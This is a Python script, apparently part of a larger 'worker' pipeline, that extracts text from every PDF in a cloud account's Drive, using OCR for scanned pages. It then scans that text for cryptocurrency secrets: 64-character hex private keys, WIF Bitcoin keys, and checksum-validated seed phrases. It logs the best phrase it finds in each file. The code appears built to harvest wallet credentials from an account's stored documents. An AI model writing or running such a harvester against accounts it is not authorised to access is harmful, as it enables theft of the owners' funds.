#!/usr/bin/env python3
"""Read every PDF in the account's Drive: text layer, then OCR for scans."""
from __future__ import annotations

import base64
import io
import json
import re
import sys
import time
from pathlib import Path

import pymupdf

sys.path.insert(0, "/opt/icloud3/python")

from worker import scan  # noqa: E402
from worker.ocr_vlm import classify, parse_output  # noqa: E402

HEX_RE = re.compile(r"\b(0x)?[0-9a-fA-F]{64}\b")
WIF_RE = re.compile(r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b")


_engine = None


def ocr_image(raw: bytes) -> str:
    global _engine
    from PIL import Image
    from rapidocr_onnxruntime import RapidOCR

    if _engine is None:
        _engine = RapidOCR()
    with Image.open(io.BytesIO(raw)) as image:
        image = image.convert("RGB")
        image.thumbnail((2200, 2200))
        buffer = io.BytesIO()
        image.save(buffer, "JPEG", quality=88)
    result, _ = _engine(buffer.getvalue())
    return "\n".join(part[1] for part in (result or []))


def main() -> None:
    folder = Path(sys.argv[1])
    out = Path(sys.argv[2])
    out.mkdir(parents=True, exist_ok=True)
    index = scan.word_index()
    rows = []

    for pdf in sorted(folder.glob("*.pdf")):
        print(f"[pdf] {pdf.name} ({pdf.stat().st_size // 1024} KB)", flush=True)
        document = pymupdf.open(pdf)
        pages = []
        for number, page in enumerate(document):
            text = page.get_text("text") or ""
            if len(text.strip()) < 40:
                pixmap = page.get_pixmap(dpi=150)
                text = ocr_image(pixmap.tobytes("jpeg"))
                source = "ocr"
            else:
                source = "text"
            pages.append({"page": number + 1, "source": source, "text": text[:4000]})
            print(f"  page {number + 1}/{len(document)} via {source}: {len(text)} chars", flush=True)
        joined = "\n".join(page["text"] for page in pages)
        rows.append(
            {
                "source": "pdf",
                "name": pdf.name,
                "phrases": list(scan.find_sequences(joined, index)),
                "hex": sorted(set(HEX_RE.findall(joined))),
                "wif": sorted(set(WIF_RE.findall(joined))),
                "pages": pages,
            }
        )
        document.close()

    (out / "pdf.jsonl").write_text("\n".join(json.dumps(r, ensure_ascii=False) for r in rows) + "\n")
    for row in rows:
        best = max(row["phrases"], key=lambda p: (p["checksum"], p["words"]), default=None)
        print(
            f"{row['name']}: phrases={len(row['phrases'])} hex={len(row['hex'])} wif={len(row['wif'])}"
            + (f" best={best['words']}w checksum={best['checksum']}" if best else "")
        )


if __name__ == "__main__":
    main()
